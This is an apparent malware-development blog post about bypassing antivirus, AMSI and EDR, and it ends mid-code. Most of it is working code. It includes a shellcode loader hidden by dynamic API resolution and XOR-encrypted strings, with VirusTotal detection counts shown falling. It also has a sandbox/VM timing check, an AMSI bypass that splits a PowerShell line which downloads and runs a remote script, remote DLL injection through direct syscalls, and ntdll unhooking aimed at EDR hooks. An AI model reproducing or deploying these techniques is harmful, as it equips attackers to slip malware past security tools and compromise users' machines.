---
layout: post
title: 8 MALDEV - Antivirus bypass
category : [Reverse, MALDEV]
tags: reverse
---

## Mechanics of antivirus engines

### Static detection 

Based on predefined signatures (collection of bytes/strings) of malicious files, those are mostly done in YARA.

### Heuristic detection 

Developed to discover suspicious traits present in unknown, new or update version of malware, two possible components, depending on security solution that's being implemented :
  - decompiling suspicious solution and comparing code fragments to known malware, flag raised if particular proportion of program's source code corresponds to any entries in heuristic database 
  - virtual environment created for software and security solution examines it to determine whether it exhibits any suspisious behavior

### Dynamic heuristic analysis 

Sandbox detection analyzes dy,amic behavior of file by executing in Sandboxed environment.

### Behavior analysis 

Once malware start operating security solution will look for suspicious indicator such as installation of **DLL**, invocation of specific **Windows API** or establishment of internet connection. If behavior are suspisous solution will carry out memory scan of running process and determined if it's malicious and terminate it in that case (but process can be terminated by solution even before if its stated dangerous).

## Evasion static detection 

Simple to circumvent but time-consuming, we need to avoid hardcoded values.

Simple function call result in a facility to determine if binary is malicious or not, antivirus examines pe file and look at its import address, so we can hid dll and external functions that will be called during runtime, we can use **GetModuleHandle** and **GetProcAddress* windows api functions.

i.e. we want to call function called **Meow** exported in DLL named cat.dll we can do :

```c 
hack = GetProcAddress(GetModuleHandle("cat.dll"), "Meow");
```

When compiling code with that it will not include cat.dll in import address table and antivirus engine will not detect it during static analysis.

### No hidden call  

```c 
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// our payload "Hello world" messagebox
unsigned char my_payload[] = 
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

unsigned int my_payload_len = sizeof(my_payload);

int main(void) {
  void * my_payload_mem; // memory buffer for payload
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // copy payload to buffer
  RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);

  // make new buffer as executable
  rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
  if ( rv != 0 ) {
  // run payload
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);
  }
  return 0;
}
```

With `objdump -x -D hack.exe | less ` we would get :


![hidecall](assets/images/maldev/8/call1.png)

As you can see, the program uses KERNEL32.dll and import a lot of functions like CreateThread, VirtualAlloc, VirtualProtect and WaitForSingleObject.

Side note : 40/70 engines detections on virus total 

### theory 

Let's try to hide **VirtualAlloc** declaration, we first need to find its [declaration](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc).

We first create global variable called *VirtualAlloc* (just a pointer), then we obtain address of VirtualAlloc with *GetProcAddress*.

### Hidden call 

```c 
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

// our payload "Hello world" messagebox
unsigned char payload[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

int main(void) {
  void * payload_mem; // memory buffer for payload
  BOOL result;
  HANDLE thread_handle;
  DWORD oldprotect = 0;

  // Allocate memory buffer for payload
  pVirtualAlloc = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
  payload_mem = pVirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  
  // copy payload to buffer
  RtlMoveMemory(payload_mem, payload, sizeof(payload));

  // make new buffer as executable
  result = VirtualProtect(payload_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldprotect);
  if ( result != 0 ) {
  // run payload
    thread_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_mem, 0, 0, 0);
    WaitForSingleObject(thread_handle, -1);
  }
  return 0;
}
```

And now if we use objdump we get : 

![hidecall2](assets/images/maldev/8/call2.png)

We successfully hide our VirtualAlloc call, however its visible with strings :

```c 
strings hack2.exe | grep Virtual 
VirtualAlloc
  VirtualQuery failed for %d bytes at address %p
  VirtualProtect failed with code 0x%x
VirtualProtect
VirtualQuery
```
### xored function name 

We can remove it utilizing Xor function to encrypt and decode strings :

```c 
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

// payload: messagebox (XOR encrypted)
unsigned char payload[] = { 0x3b, 0xe6, 0x8f, 0x5a, 0x2d, 0xf7, 0x97, 0x95, 0x2b, 0xff, 0x70, 0x12, 0x73, 0x65, 0x63, 0x3a, 0xe8, 0x79, 0x21, 0x65, 0x63, 0x72, 0x8d, 0xea, 0x73, 0x65, 0x63, 0x3e, 0xee, 0x8c, 0x3b, 0xe8, 0x6e, 0x2f, 0x65, 0x74, 0x73, 0x9a, 0xb3, 0x3a, 0xe8, 0x61, 0x2c, 0x65, 0x63, 0x72, 0x2d, 0xf9, 0x7e, 0x28, 0x63, 0x72, 0x65, 0x9c, 0xc, 0x65, 0x63, 0x72, 0x28, 0x47, 0xba, 0x29, 0xee, 0x77, 0x4, 0x74, 0x73, 0x65, 0x2b, 0xff, 0x70, 0x3a, 0x73, 0x65, 0x63, 0x3a, 0x56, 0xbd, 0x8c, 0xb5, 0x2b, 0xff, 0x70, 0x22, 0x73, 0x65, 0x63, 0x3a, 0xe8, 0x79, 0x79, 0x65, 0x63, 0x72, 0x8d, 0x22, 0x73, 0x65, 0x63, 0x3a, 0x56, 0xbd, 0x8c, 0xb5, 0x28, 0x37, 0x37, 0x3a, 0x36, 0x29, 0x50, 0x40, 0x4b, 0x30, 0x3f, 0x29, 0x63, 0x3e, 0xa, 0x15, 0x17, 0x29, 0xa, 0x10, 0x17, 0x15, 0x1, 0x1c, 0x22, 0x72, 0x30, 0x27, 0x36, 0x37, 0x50, 0x40, 0x4b, 0x30, 0x3f, 0x29, 0x63, 0x3f, 0x0, 0x7, 0x0, 0x4, 0x4, 0x17, 0x27, 0x1b, 0xb, 0x24, 0x63, 0x3a, 0x0, 0x18, 0x1f, 0xa, 0x43, 0x5, 0xa, 0x6, 0x1f, 0x1, 0x63, 0x3f, 0x0, 0x7, 0x0, 0x4, 0x4, 0x17, 0x65, 0x31, 0xb, 0xc, 0x17, 0x22, 0x17, 0x1b, 0x10, 0x0, 0x10, 0x1, 0x65, 0x3c, 0xf0, 0x89, 0x4b, 0x17, 0x29, 0xff, 0x77, 0x40, 0x3, 0x72, 0x65, 0x74, 0x3e, 0xee, 0x23, 0x6a, 0x28, 0xf9, 0x13, 0x75, 0x2e, 0xf9, 0x61, 0x50, 0x8f, 0x2c, 0xe8, 0xa, 0x5, 0x3c, 0xf8, 0x94, 0xcf, 0xf6, 0xa5, 0x0, 0x55, 0xef, 0x44, 0xf2, 0x99, 0x15, 0xf, 0x66, 0xe3, 0x9e, 0x45, 0x4e, 0x93, 0x10, 0x6b, 0x3a, 0x9a, 0xb3, 0x3b, 0x9a, 0xa4, 0x99, 0x80, 0x39, 0xf8, 0x65, 0x2e, 0x49, 0xa1, 0x1, 0xa5, 0x2d, 0x50, 0xb2, 0x8c, 0xd3, 0x73, 0x65, 0x63, 0x3b, 0xee, 0x2c, 0x43, 0x21, 0xe8, 0x39, 0x59, 0x38, 0x70, 0xae, 0x2a, 0xf3, 0xa4, 0xfc, 0x73, 0x65, 0x63, 0x37, 0xee, 0x5d, 0x3e, 0xe0, 0x8e, 0x7, 0x6d, 0x3c, 0x40, 0xa5, 0x8a, 0xf7, 0x65, 0x74, 0x73, 0x2b, 0xee, 0x76, 0x4e, 0x31, 0xf8, 0x14, 0x67, 0x3f, 0x66, 0x81, 0x32, 0xee, 0x2b, 0x6a, 0x20, 0xff, 0x23, 0x45, 0x2f, 0x71, 0xb6, 0x8b, 0xba, 0x28, 0xee, 0x7e, 0xef, 0x35, 0xf8, 0x5c, 0x2b, 0x71, 0x9e, 0x3c, 0xf8, 0x97, 0xc5, 0x7, 0x6d, 0xfe, 0x75, 0xe1, 0xa3, 0x6, 0x6c, 0x9f, 0x86, 0x87, 0x85, 0x3a, 0x56, 0xb4, 0x98, 0x2b, 0x26, 0xf9, 0x2d, 0x50, 0x3f, 0x66, 0xa8, 0x14, 0x24, 0xff, 0x7f, 0x2c, 0x26, 0xf9, 0x2d, 0x68, 0x3f, 0x66, 0xa8, 0x33, 0xee, 0x70, 0xfa, 0x2c, 0x58, 0xb7, 0x19, 0x5b, 0x3a, 0x5e, 0xa5, 0x1, 0x4f, 0x3c, 0xfe, 0x51, 0x7b, 0x3a, 0xe8, 0x8, 0x57, 0x55, 0x2f, 0xf9, 0x82, 0xd0, 0xf3, 0x5b, 0x4d, 0x7, 0x9f, 0xd0, 0xb4, 0x62, 0x27, 0x3e, 0x29, 0x74, 0x3a, 0xee, 0xaf, 0x33, 0x9a, 0xa3, 0x3a, 0xee, 0xaf, 0x3a, 0xee, 0xa2, 0x9a, 0x71, 0x9c, 0x8d, 0x9a, 0x3c, 0x70, 0xa6, 0x2b, 0xf1, 0xa1, 0x5c, 0xb0 };
unsigned char cVirtualAlloc[] = { 0x25, 0xc, 0x11, 0x6, 0x10, 0x15, 0x1f, 0x24, 0xf, 0x1e, 0xa, 0x17 };

char secretKey[] = "secret";

// encryption / decryption XOR function
void deXOR(char *buffer, size_t bufferLength, char *key, size_t keyLength) {
  int keyIndex = 0;
  for (int i = 0; i < bufferLength; i++) {
    if (keyIndex == keyLength - 1) keyIndex = 0;
    buffer[i] = buffer[i] ^ key[keyIndex];
    keyIndex++;
  }
}

int main(void) {
  void * payload_mem; // memory buffer for payload
  BOOL result;
  HANDLE thread_handle;
  DWORD oldprotect = 0;
  
  // decrypt payload
  deXOR((char*)payload, sizeof(payload), secretKey, sizeof(secretKey));
  deXOR((char*)cVirtualAlloc, sizeof(cVirtualAlloc), secretKey, sizeof(secretKey));

  // allocate memory buffer for payload
  HMODULE kernel = GetModuleHandle("kernel32.dll");
  pVirtualAlloc = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(kernel, (LPCSTR)cVirtualAlloc);
  payload_mem = pVirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

   // copy payload to buffer
  RtlMoveMemory(payload_mem, payload, sizeof(payload));

  // make new buffer as executable
  result = VirtualProtect(payload_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldprotect);
  if ( result != 0 ) {
  // run payload
    thread_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_mem, 0, 0, 0);
    WaitForSingleObject(thread_handle, -1);
  }
  return 0;
}
```

#### Result 
We finally hide our VirtualAlloc call, and by uploading it to virus total we reduce the number of engines that recognize it malicious to 13.
![hidecall3](assets/images/maldev/8/call3.png)

## Evasion dynamic analysis 

### Main C implementation

This is about sleep interval calculation again but we should be able to see if we are in a vm or not (with some adjustement) :

```c 
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Definitions for NtDelayExecution
typedef NTSTATUS (WINAPI *fnNtDelayExecution)(
  BOOLEAN Alertable,
  PLARGE_INTEGER DelayInterval
);

// Function to check if the system is a virtual machine
BOOL checkVM() {
  // Get the system uptime before sleeping
  ULONG64 uptimeBeforeSleep = GetTickCount64();

  // Dynamically obtain the address of NtDelayExecution
  HMODULE ntdll = GetModuleHandle("ntdll.dll");
  fnNtDelayExecution myNtDelayExecution = (fnNtDelayExecution)GetProcAddress(ntdll, "NtDelayExecution");

  // Check if the function is successfully obtained
  if (!myNtDelayExecution) {
    printf("Failed to obtain NtDelayExecution function address.\n");
    return FALSE;
  }

  // Set the sleep time (in 100-nanosecond intervals) - adjust as needed
  LARGE_INTEGER sleepInterval;
  sleepInterval.QuadPart = -10000000; // 1 second

  // Call NtDelayExecution to sleep
  myNtDelayExecution(FALSE, &sleepInterval);

  // Get the system uptime after sleeping
  ULONG64 uptimeAfterSleep = GetTickCount64();

  // Calculate the actual sleep time in milliseconds
  ULONG64 actualSleepTime = uptimeAfterSleep - uptimeBeforeSleep;

  // Print the actual sleep time
  printf("Actual sleep time: %llu milliseconds\n", actualSleepTime);

  // Check if the actual sleep time is close to the expected sleep time
  // This is just a basic example, you might want to adjust the threshold based on your specific use case
  if (actualSleepTime < 1000 && actualSleepTime > 800) {
    printf("Likely not a virtual machine.\n");
  } else {
    printf("Possibly a virtual machine.\n");
  }

  return TRUE;
}

int main() {
  if (checkVM()) {
    // Handle virtual machine detected case
    MessageBox(NULL, "Meow!", "=^..^=", MB_OK);
  } else {
    // Handle non-virtual machine case
    MessageBox(NULL, "Squeak!", "=^..^=", MB_OK);
  }
  return 0;
}
```

## Bypass Anti-malware Scan Interface

A collection of Windows APIs known as AMSI allow integration any application with an antivirus product (assuming that product functions as AMSI provider) i.e. Windows Defender functions as AMSI provider as numerous third-party antivirus solutions.

AMSI functions as intermediary that connects application and antivirus engine. I.E Powershell :
1. before execution powershell send code that user want to execute to AMSI 
2. AMSI generate report if antivirus engine state content as malicious preventing powershell from executing it 

This resolve issue of script-based malware that operates exclusively in memory and never go to disk 

To provied AMSI instance application is required to load **amsi.dll** into its address space and invoke sequence of amsi APIs. By tying powershell to a tool such as APIMonitor we can observe which APIs it invokes.

### Example 

Two predominant techniques are employed for bypassing AMSI are obfuscation and patchin amsi.dll module in memory. Here we will try first option :

i.e. if we want to run :

```powershell 
iex ((New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"))
```

We will get an error with `ScriptContainedMaliciousContent` .

But as AMSI use a string-based  detection approach, we can evade it by avoiding direct usage of prohibited string with a string division technique by doing something like :

```powershell 
$bad = "iex ((New-Object System.Net.WebClient).DownloadSt" + "ring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit'" + "'/master/Privesc/PowerUp.ps1'))"

$bad
```

This approach is widely used in context of obfuscation.

## Advanced evasion techniques

### Syscalls 

**Windows syscalls** let programs talk to OS and ask for specific services like reading/writing to file etc.
When call to WinAPI function, syscalls are APIs that run the task i.e when using VirtualAlloc WINApi calls are called, **NtAllocateVirtualMemory** starts running. Syscall sends user-supplied args from previous function call to windows kernel, does what was asked for, sends result back to program.

Error code shown in **NTSTATUS** value that all syscalls return, if syscall successful return 0.

microsoft hasn't written doc for most syscalls, so syscalls modules will use this reference from ReacOS NTDLL : `https://doxygen.reactos.org/dir_
a7ad942ac829d916497d820c4a26c555.html`

Lot of syscall are processed and sent ou from ntdll.dll.

Using syscalls give low-level access to OS, can be helpful when needing to do things that normal WinAPIs don't let you do.

Syscalls can be used to get arouh host-based security measures.

#### Syscall ID

Unique number for each syscall using x64dbg and notepad.exe we can get that NtAllocateMemory has ID 18.

![hidecall4](assets/images/maldev/8/call4.png)

However IDs different based on OS and version.

### Userland hooking 

**Api hooking** often done in security software, lets tools look at and record how applications works. Moreover this security solutions can look through any memory are marked as executable and look for patterns or fingerprints. When these hooks are installed in user mode, usually set up before syscall order is carried out.

### Direct syscalls 

Directly utilizing syscalls is one approach to bypass userland hooks. Creating cursomized version of syscall function in assembly language and execute it directly from assembly file can be done to avoid dectection by hook into syscalls in user space.

#### Example 

Example pf syscall generated in assembly file :

```asm 
section .text
global myNtAllocateVirtualMemory
myNtAllocateVirtualMemory:
  mov r10, rcx
  mov eax, 18h ; syscall number for NtAllocateVirtualMemory
  syscall
  ret
```

Subsequent assembly function can be used in place of `NtAllocateVirtualMemory` with GetProcAddress and GetModuleHandle to get same result. By doing so, need to invoke `NtAllocateVirtualMemory` from within *ntdll* address space, which contains hook, is eliminated.

Here is an example of how to use this :

```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

char maliciousLibraryPath[] = "C:\\temp\\evil.dll";
unsigned int maliciousLibraryPathLength = sizeof(maliciousLibraryPath) + 1;

extern "C" NTSTATUS myNtAllocateVirtualMemory(
    HANDLE             ProcessHandle,
    PVOID              *BaseAddress,
    ULONG              ZeroBits,
    PULONG             RegionSize,
    ULONG              AllocationType,
    ULONG              Protect
);

int main(int argc, char* argv[]) {
  HANDLE targetProcess; // Handle to the target process
  HANDLE remoteThread;  // Remote thread
  LPVOID remoteBuffer;  // Remote buffer for data

  // Get the handle to Kernel32 and obtain function pointer
  HMODULE kernel32Handle = GetModuleHandle("Kernel32");
  VOID *loadLibraryFunction = (VOID*)GetProcAddress(kernel32Handle, "LoadLibraryA");

  // Parse the process ID
  if (atoi(argv[1]) == 0) {
    printf("Process ID not found. Exiting...\n");
    return -1;
  }
  printf("Process ID: %i", atoi(argv[1]));
  targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  myNtAllocateVirtualMemory(targetProcess, &remoteBuffer, 0, (PULONG)&maliciousLibraryPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  // Inject the malicious DLL into the target process
  WriteProcessMemory(targetProcess, remoteBuffer, maliciousLibraryPath, maliciousLibraryPathLength, NULL);

  // Start a new thread in the target process
  remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryFunction, remoteBuffer, 0, NULL);
  CloseHandle(targetProcess);
  return 0;
}
```

To incorporate assembly function into C, we must employ extern "C" (EXTERN_C) directive.

We can compile .asm file with : `nasm -f win64 -o syscall.o syscall.asm`

and compile c code with :

```bash
x86_64-w64-mingw32-g++ -m64 -c hack2.c -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc-Wall -shared -fpermissive

x86_64-w64-mingw32-gcc *.o -o hack2.exe
```

other example would be :

```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
  HANDLE             ProcessHandle,
  PVOID              *BaseAddress,
  ULONG              ZeroBits,
  PULONG             RegionSize,
  ULONG              AllocationType,
  ULONG              Protect
);

char maliciousLibraryPath[] = "evil.dll";
unsigned int maliciousLibraryPathLength = sizeof(maliciousLibraryPath) + 1;

int findProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

int main(int argc, char* argv[]) {
  HANDLE targetProcess; // Target process handle
  HANDLE remoteThread;  // Remote thread
  LPVOID remoteBuffer;  // Remote buffer for data

  // Obtain handles to kernel32 and ntdll and retrieve function pointer
  HMODULE kernel32Handle = GetModuleHandle("Kernel32");
  HMODULE ntdllHandle = GetModuleHandle("ntdll");
  VOID *loadLibraryFunction = (VOID *)GetProcAddress(kernel32Handle, "LoadLibraryA");

  STARTUPINFOA si;
  PROCESS_INFORMATION pi;
  ZeroMemory(&si, sizeof(STARTUPINFOA));
  si.cb = sizeof(STARTUPINFOA);
  const char* process = "mspaint.exe";
  CreateProcessA(NULL, (LPSTR)process,
  NULL, NULL, FALSE, 0, NULL, NULL, &si,&pi);
  int pid = -1;
  pid = findProc(process);

  // Parse process ID
  if (pid <= 0) {
    printf("Process ID not found. Exiting...\n");
    return -1;
  }

  printf("Process ID: %i", pid);
  targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

  pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdllHandle, "NtAllocateVirtualMemory");  

  // Allocate memory buffer in the remote process
  myNtAllocateVirtualMemory(targetProcess, &remoteBuffer, 0, (PULONG)&maliciousLibraryPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  // Copy the malicious DLL path to the remote process
  WriteProcessMemory(targetProcess, remoteBuffer, maliciousLibraryPath, maliciousLibraryPathLength, NULL);

  // Start a new thread in the target process
  remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryFunction, remoteBuffer, 0, NULL);
  CloseHandle(targetProcess);
  return 0;
}
```

### Bypassing EDR 

Instead of bypassing infected *ntdlll.dll* hooks with direct syscall, EDR hook might be completely removed from loaded module (unhook any DLL loaded in memory) by reading .text section from disk and placing it on top of .text section of mapped ntdll.dl. This may heko avoid some EDR solutions that rely on userland API hooking.

#### Example

Here looking into McAfee EDR, hooking engine of other EDR may differ...

```c 
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <psapi.h>

int main() {
  HANDLE hProcess = GetCurrentProcess();
  MODULEINFO moduleInfo = {};
  HMODULE hNtdllModule = GetModuleHandleA("ntdll.dll");
  LPVOID lpStartingPageAddress = NULL;
  SIZE_T dwSizeOfTheRegion = NULL;

  // retrieve information about the loaded ntdll.dll module
  GetModuleInformation(hProcess, hNtdllModule, &moduleInfo, sizeof(moduleInfo));

  // get the base address of the ntdll.dll module
  LPVOID lpNtdllBase = (LPVOID)moduleInfo.lpBaseOfDll;

  // open the ntdll.dll file
  HANDLE hNtdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

  // create a file mapping for the ntdll.dll file
  HANDLE hNtdllMapping = CreateFileMapping(hNtdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);

  // map the file mapping into the process's virtual address space
  LPVOID lpNtdllMappingAddress = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, 0, 0, 0);

  // get the DOS header of the hooked ntdll.dll
  PIMAGE_DOS_HEADER pDosHeaderOfHookedDll = (PIMAGE_DOS_HEADER)lpNtdllBase;

  // get the NT header of the hooked ntdll.dll
  PIMAGE_NT_HEADERS pNtHeaderOfHookedDll = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpNtdllBase + pDosHeaderOfHookedDll->e_lfanew);

  // loop through each section of the PE header
  for (WORD i = 0; i < pNtHeaderOfHookedDll->FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER pHookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeaderOfHookedDll) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

    // check if the section is the .text section
    if (!strcmp((char*)pHookedSectionHeader->Name, (char*)".text")) {
      DWORD dwOldProtection = 0;
      lpStartingPageAddress = (LPVOID)((DWORD_PTR)lpNtdllBase + (DWORD_PTR)pHookedSectionHeader->VirtualAddress);
      dwSizeOfTheRegion = pHookedSectionHeader->Misc.VirtualSize;

      // change the protection of the memory region to allow writing
      bool bIsProtected = VirtualProtect(lpStartingPageAddress, dwSizeOfTheRegion, PAGE_EXECUTE_READWRITE, &dwOldProtection);

      // copy the contents of the .text section from the clean ntdll.dll to the infected version
